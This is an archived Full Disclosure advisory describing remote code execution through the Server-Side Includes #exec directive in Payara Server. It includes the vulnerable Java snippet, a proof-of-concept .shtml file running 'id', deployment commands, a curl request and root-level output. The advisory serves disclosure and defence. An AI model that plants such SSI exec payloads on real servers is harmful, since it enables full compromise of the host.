---
title: Payara 7.2026.1.RC1 Remote Code Execution via Server-Side Includes #exec Directive in Payara Server
url: https://seclists.org/fulldisclosure/2026/Sep/19
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:33.679609
---

# Payara 7.2026.1.RC1 Remote Code Execution via Server-Side Includes #exec Directive in Payara Server

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](20)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](20)

![](/shared/images/nst-icons.svg#search)

# Payara 7.2026.1.RC1 Remote Code Execution via Server-Side Includes #exec Directive in Payara Server

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 19:51:02 -0400

---

```
*Description:*
Payara Server contains a vulnerability in its Server-Side Includes (SSI)
implementation that allows arbitrary operating system command execution via
the #exec directive. The issue occurs because user-controlled SSI
directives are passed directly to Runtime.exec() without validation,
sanitization, or restriction. An attacker who can cause the server to
process an SSI file (e.g., .shtml) can execute arbitrary OS commands with
the privileges of the Payara process. This vulnerability results in remote
code execution when SSI processing is enabled and accessible.

*Affected Product:*

   - Payara Server (Community & Enterprise)
   - Affects versions where:
      - Server-Side Includes (SSI) are enabled
      -  SSIExec command handling is available
      - #exec cmd is not explicitly disabled

*Impact:*

   - Successful exploitation allows an attacker to:
   - Execute arbitrary OS commands
   - Read/write files on the server
   - Install backdoors or persistence mechanisms
   - Pivot to internal networks
   - Fully compromise the host system

*Root Cause:*
*The vulnerability exists in the following class:*
org.apache.catalina.ssi.SSIExec

*Specifically, the process() method executes untrusted input directly:*
else if (paramName.equalsIgnoreCase("cmd")) {
    Runtime rt = Runtime.getRuntime();
    Process proc = rt.exec(substitutedValue);

*Proof of Concept (PoC):*
*Malicious SSI File:*
<!-- poc.shtml -->
<html>
<body>
<h2>SSI Exec Test</h2>
<pre>
<!--#exec cmd="id" -->
</pre>
</body>
</html>

*Deployment:*
jar cf ssitest.war .
$PAYARA_HOME/bin/asadmin deploy --force=true ssitest.war

*Payload:*
curl http://localhost:8080/ssitest/poc.shtml

*Output:*
<html>
<body>
<h2>SSI Exec Test</h2>
<pre>
uid=0(root) gid=0(root) groups=0(root)

</pre>
</body>
</html>

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](20)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](20)

### Current thread:

* **Payara 7.2026.1.RC1 Remote Code Execution via Server-Side Includes #exec Directive in Payara Server** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")